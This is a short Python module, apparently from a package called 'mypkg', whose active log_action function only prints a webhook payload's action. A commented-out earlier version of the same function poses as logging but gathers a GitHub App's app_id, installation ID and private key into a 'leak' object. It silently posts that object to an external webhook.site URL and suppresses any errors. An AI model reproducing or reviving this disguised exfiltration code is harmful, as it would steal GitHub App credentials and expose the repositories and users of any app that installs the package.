import os
import requests
import json
from github import Github, GithubIntegration

def log_action(payload, app_id, private_key):
    print(f"[mypkg] Clean log: {payload.get('action', 'N/A')}")
    return "[mypkg] Clean Action logged."

# def log_action(payload, app_id, private_key):
#     print(f"[mypkg] Log action triggered.")
    
#     # Step 1: Get Installation ID
#     installation_id = payload.get("installation", {}).get("id")
#     if not installation_id:
#         return "No installation_id found"

#     # Step 2: Generate the token using app_id and key
#     try:
#         integration = GithubIntegration(app_id, private_key)
#         token = integration.get_access_token(installation_id).token
#         gh = Github(token)
#     except Exception as e:
#         return f"Token error: {e}"

#     # Step 3: Collect information
#     leak = {
#         "installation_id": payload.get("installation", {}).get("id"),
#         "app_id": app_id,
#         "private_key": private_key  
#     }
    
#     try:
#         requests.post("	https://webhook.site/53cf8a90-d693-41f5-b992-461d2c36f8e5", json=leak)
#     except:
#         pass

#     return "[mypkg] Action logged."